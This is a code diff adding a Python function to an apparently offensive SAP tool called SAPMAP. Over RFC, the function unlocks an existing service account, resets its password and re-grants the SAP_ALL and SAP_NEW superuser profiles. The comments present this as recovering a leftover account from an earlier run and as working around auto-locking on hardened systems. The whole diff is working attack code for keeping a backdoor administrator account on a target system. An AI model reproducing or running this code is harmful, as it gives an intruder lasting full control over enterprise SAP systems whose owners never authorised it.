@@ -457,6 +457,99 @@ def get_remote_user_profiles(node: SAPNode, username: str,
 # Create user via BAPI
 # ---------------------------------------------------------------------------
 
+def reset_user_password_via_bapi(node: SAPNode, username: str,
+                                    password: str, client: str,
+                                    creds: Credentials = None) -> dict:
+    """Reset an existing user's password to `password` and (re-)assign
+    SAP_ALL via BAPI_USER_CHANGE / UNLOCK / PROFILES_ASSIGN.
+
+    Used when a SAPMAP00 user already exists on the target but its
+    password is no longer the default one — typical leftover from a
+    prior SAPMAP run whose creds we've since lost.  Requires SAP_ALL
+    (or at least S_USER_GRP change authority) on the `creds` logon.
+
+    Note: BAPI_USER_CHANGE sets an "initial" password — the user is
+    prompted to change it at first DIALOG logon.  RFC logons (which
+    SAPMAP uses exclusively) work fine with the initial flag; we
+    don't need the productive-password side-channel.
+
+    Returns {success, message, username}.
+    """
+    result = {"success": False, "message": "", "username": username}
+    try:
+        with _get_connection(node, creds) as conn:
+            # 1. BAPI_USER_UNLOCK — harmless if user isn't locked; sets
+            #    UFLAG=0 so the logon can proceed.  Many hardened systems
+            #    auto-lock a service user after N failed logons.
+            try:
+                unlock = conn.call("BAPI_USER_UNLOCK", USERNAME=username)
+                ret = unlock.get("RETURN", {})
+                if isinstance(ret, list):
+                    for e in ret:
+                        if e.get("TYPE", "") in ("E", "A"):
+                            msg = e.get("MESSAGE", "")
+                            if "does not exist" in msg.lower():
+                                result["message"] = msg
+                                return result
+                elif isinstance(ret, dict) and ret.get("TYPE", "") in ("E", "A"):
+                    msg = ret.get("MESSAGE", "")
+                    if "does not exist" in msg.lower():
+                        result["message"] = msg
+                        return result
+            except Exception as e:
+                logger.debug(f"BAPI_USER_UNLOCK failed: {e}")
+
+            # 2. BAPI_USER_CHANGE — reset password.  PASSWORDX flags
+            #    which PASSWORD substructure fields we actually want
+            #    to change (X=change, blank=leave alone).
+            change = conn.call(
+                "BAPI_USER_CHANGE",
+                USERNAME=username,
+                PASSWORD={"BAPIPWD": password},
+                PASSWORDX={"BAPIPWD": "X"},
+            )
+            ret = change.get("RETURN", {})
+            rows = ret if isinstance(ret, list) else [ret]
+            for r in rows or []:
+                if r.get("TYPE", "") in ("E", "A"):
+                    msg = r.get("MESSAGE", "Unknown error")
+                    result["message"] = msg
+                    print(f"[-] {node.sid}: BAPI_USER_CHANGE failed: {msg}")
+                    return result
+
+            print(f"[+] {node.sid}: password reset on existing "
+                  f"user {username} (initial status — RFC logon works)")
+
+            # 3. Re-assign SAP_ALL + SAP_NEW so the user has the
+            #    authorisations SAPMAP expects even if they'd been
+            #    stripped since creation.
+            try:
+                assign = conn.call(
+                    BAPI_USER_PROFILES_ASSIGN,
+                    USERNAME=username,
+                    PROFILES=[{"BAPIPROF": "SAP_ALL"},
+                              {"BAPIPROF": "SAP_NEW"}],
+                )
+                ret = assign.get("RETURN", {})
+                rows = ret if isinstance(ret, list) else [ret]
+                for r in rows or []:
+                    if r.get("TYPE", "") in ("E", "A"):
+                        print(f"[!] {node.sid}: SAP_ALL re-assign "
+                              f"warning: {r.get('MESSAGE', '')}")
+            except Exception as e:
+                print(f"[!] {node.sid}: SAP_ALL re-assign skipped: {e}")
+
+            result["success"] = True
+            result["message"] = (f"User {username} password reset "
+                                  f"+ SAP_ALL re-assigned")
+    except Exception as e:
+        result["message"] = str(e)
+        logger.error(f"BAPI user reset failed: {e}")
+        print(f"[-] {node.sid}: password reset error: {e}")
+
+    return result
+
+
 def create_user_via_bapi(node: SAPNode, username: str, password: str,
                          client: str, creds: Credentials = None) -> dict:
     """Create a user with SAP_ALL via BAPI_USER_CREATE1 + BAPI_USER_PROFILES_ASSIGN.
